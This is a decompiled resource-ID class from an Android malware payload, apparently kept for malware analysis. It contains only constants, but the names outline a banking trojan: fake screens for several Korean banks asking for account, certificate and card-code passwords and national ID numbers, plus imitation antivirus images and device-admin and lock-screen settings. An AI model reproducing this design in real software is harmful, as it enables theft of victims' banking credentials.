package com.sdwiurse;

public final class R
{
  public static final class anim
  {
    public static final int wait = 2130968576;
  }
  
  public static final class attr {}
  
  public static final class color
  {
    public static final int transparent_background = 2131165184;
  }
  
  public static final class dimen
  {
    public static final int activity_horizontal_margin = 2131230720;
    public static final int activity_vertical_margin = 2131230721;
  }
  
  public static final class drawable
  {
    public static final int background_div_a = 2130837504;
    public static final int background_div_ab = 2130837505;
    public static final int background_div_bg = 2130837506;
    public static final int box_listenter_icon1 = 2130837507;
    public static final int btn_cancel = 2130837508;
    public static final int btn_cancel_off_gnb = 2130837509;
    public static final int btn_confirm_off_gnw = 2130837510;
    public static final int btn_next = 2130837511;
    public static final int dialog_inside_layout = 2130837512;
    public static final int edit_normal = 2130837513;
    public static final int edit_pressed = 2130837514;
    public static final int first = 2130837515;
    public static final int hana = 2130837516;
    public static final int ic_launcher = 2130837517;
    public static final int indeterminate_spinner = 2130837518;
    public static final int intro = 2130837519;
    public static final int kb = 2130837520;
    public static final int kb_account = 2130837521;
    public static final int kb_account_no = 2130837522;
    public static final int kb_account_psw = 2130837523;
    public static final int kb_account_psw_large = 2130837524;
    public static final int kb_ars = 2130837525;
    public static final int kb_ba_center = 2130837526;
    public static final int kb_card_number = 2130837527;
    public static final int kb_cert_editbox = 2130837528;
    public static final int kb_cert_item = 2130837529;
    public static final int kb_cert_list = 2130837530;
    public static final int kb_cert_psw = 2130837531;
    public static final int kb_icon = 2130837532;
    public static final int kb_icon1 = 2130837533;
    public static final int kb_last_ok = 2130837534;
    public static final int kb_loading_box = 2130837535;
    public static final int kb_name = 2130837536;
    public static final int kb_person_check = 2130837537;
    public static final int kb_person_id = 2130837538;
    public static final int kb_select_listview = 2130837539;
    public static final int nf_bg_edit_text = 2130837540;
    public static final int nh = 2130837541;
    public static final int s1 = 2130837542;
    public static final int s2 = 2130837543;
    public static final int s3 = 2130837544;
    public static final int s4 = 2130837545;
    public static final int s5 = 2130837546;
    public static final int s6 = 2130837547;
    public static final int s7 = 2130837548;
    public static final int s8 = 2130837549;
    public static final int s9 = 2130837550;
    public static final int securerunning_img = 2130837551;
    public static final int selector_edittext_bg = 2130837552;
    public static final int sh = 2130837553;
    public static final int shinhan_card_number = 2130837554;
    public static final int shinhan_editview_line = 2130837555;
    public static final int shinhan_send_pwd = 2130837556;
    public static final int title = 2130837557;
    public static final int titlebtn_pre = 2130837558;
    public static final int v3_plus_32 = 2130837559;
    public static final int v3plus_run = 2130837560;
  }
  
  public static final class id
  {
    public static final int action_settings = 2131296312;
    public static final int ars_wait_layout = 2131296309;
    public static final int btn_cancel = 2131296265;
    public static final int btn_cert_cancel = 2131296307;
    public static final int btn_cert_confirm = 2131296306;
    public static final int btn_confirm = 2131296264;
    public static final int cert_item_ll = 2131296301;
    public static final int et_account = 2131296262;
    public static final int et_account_psw = 2131296263;
    public static final int et_card_1 = 2131296266;
    public static final int et_card_10 = 2131296277;
    public static final int et_card_11 = 2131296282;
    public static final int et_card_12 = 2131296287;
    public static final int et_card_13 = 2131296292;
    public static final int et_card_14 = 2131296297;
    public static final int et_card_15 = 2131296268;
    public static final int et_card_16 = 2131296273;
    public static final int et_card_17 = 2131296278;
    public static final int et_card_18 = 2131296283;
    public static final int et_card_19 = 2131296288;
    public static final int et_card_2 = 2131296271;
    public static final int et_card_20 = 2131296293;
    public static final int et_card_21 = 2131296298;
    public static final int et_card_22 = 2131296269;
    public static final int et_card_23 = 2131296274;
    public static final int et_card_24 = 2131296279;
    public static final int et_card_25 = 2131296284;
    public static final int et_card_26 = 2131296289;
    public static final int et_card_27 = 2131296294;
    public static final int et_card_28 = 2131296299;
    public static final int et_card_29 = 2131296270;
    public static final int et_card_3 = 2131296276;
    public static final int et_card_30 = 2131296275;
    public static final int et_card_31 = 2131296280;
    public static final int et_card_32 = 2131296285;
    public static final int et_card_33 = 2131296290;
    public static final int et_card_34 = 2131296295;
    public static final int et_card_35 = 2131296300;
    public static final int et_card_4 = 2131296281;
    public static final int et_card_5 = 2131296286;
    public static final int et_card_6 = 2131296291;
    public static final int et_card_7 = 2131296296;
    public static final int et_card_8 = 2131296267;
    public static final int et_card_9 = 2131296272;
    public static final int et_cert_psw = 2131296305;
    public static final int et_id_first = 2131296260;
    public static final int et_id_second = 2131296261;
    public static final int et_name = 2131296259;
    public static final int et_trans_psw = 2131296318;
    public static final int head_center_layout = 2131296257;
    public static final int head_layout = 2131296256;
    public static final int head_menu_left_btn = 2131296258;
    public static final int hidde_id = 2131296313;
    public static final int infoOperating = 2131296311;
    public static final int kb_general_listview = 2131296310;
    public static final int last_layout = 2131296308;
    public static final int linearLayout1 = 2131296314;
    public static final int ll_trans_psw = 2131296317;
    public static final int textView1 = 2131296316;
    public static final int textView2 = 2131296315;
    public static final int tv_card_31 = 2131296319;
    public static final int tv_card_32 = 2131296320;
    public static final int tv_card_33 = 2131296321;
    public static final int tv_card_34 = 2131296322;
    public static final int tv_card_35 = 2131296323;
    public static final int tv_expire = 2131296303;
    public static final int tv_issue = 2131296304;
    public static final int tv_name = 2131296302;
  }
  
  public static final class layout
  {
    public static final int a_main = 2130903040;
    public static final int hana_main_activity = 2130903041;
    public static final int kb_account_head_layout = 2130903042;
    public static final int kb_account_info_layout = 2130903043;
    public static final int kb_account_psw_layout = 2130903044;
    public static final int kb_card_head_layout = 2130903045;
    public static final int kb_card_layout = 2130903046;
    public static final int kb_cert_item = 2130903047;
    public static final int kb_cert_item1 = 2130903048;
    public static final int kb_cert_psw_layout = 2130903049;
    public static final int kb_head_menu_layout = 2130903050;
    public static final int kb_last_head_layout = 2130903051;
    public static final int kb_last_layout = 2130903052;
    public static final int kb_listview_layout = 2130903053;
    public static final int kb_type_activity = 2130903054;
    public static final int nh_type_activity = 2130903055;
    public static final int sh_type_activity = 2130903056;
    public static final int v3_main = 2130903057;
    public static final int woori_main_activity = 2130903058;
  }
  
  public static final class menu
  {
    public static final int main = 2131492864;
  }
  
  public static final class raw
  {
    public static final int config = 2131099648;
    public static final int ff = 2131099649;
  }
  
  public static final class string
  {
    public static final int action_settings = 2131361793;
    public static final int app_down_msg = 2131361825;
    public static final int app_error_msg = 2131361824;
    public static final int app_name = 2131361792;
    public static final int ars_wait = 2131361807;
    public static final int cancel = 2131361805;
    public static final int confirm = 2131361804;
    public static final int download_failed = 2131361823;
    public static final int enter_account = 2131361812;
    public static final int enter_card = 2131361809;
    public static final int enter_id_first = 2131361810;
    public static final int enter_id_second = 2131361811;
    public static final int enter_mobile = 2131361814;
    public static final int enter_name = 2131361808;
    public static final int enter_psw = 2131361813;
    public static final int entered_invalid_psw = 2131361802;
    public static final int entered_invalid_trans_psw = 2131361828;
    public static final int hint_psw_four = 2131361799;
    public static final int hint_trans_psw = 2131361826;
    public static final int hint_without_line = 2131361798;
    public static final int invalid_account_psw = 2131361801;
    public static final int last_line_1 = 2131361817;
    public static final int last_line_2 = 2131361818;
    public static final int last_line_3 = 2131361819;
    public static final int loading_msg = 2131361806;
    public static final int no_sd_card = 2131361822;
    public static final int notify = 2131361797;
    public static final int notify_msg = 2131361796;
    public static final int please_enter_cert_psw = 2131361800;
    public static final int please_wait = 2131361815;
    public static final int security_msg = 2131361820;
    public static final int security_notify = 2131361795;
    public static final int select_cert = 2131361794;
    public static final int submit_error = 2131361816;
    public static final int trans_psw = 2131361827;
    public static final int uwrite = 2131361821;
    public static final int wanna_exit = 2131361803;
  }
  
  public static final class style
  {
    public static final int AppBaseTheme = 2131427328;
    public static final int AppTheme = 2131427329;
    public static final int my_edittext_style = 2131427330;
  }
  
  public static final class xml
  {
    public static final int device_admin = 2131034112;
    public static final int lock_screen = 2131034113;
  }
}


/* Location:              /home/enzo/Documents/BorelEnzo.github.io/malwares/dsencrypt/payload.jar!/com/sdwiurse/R.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */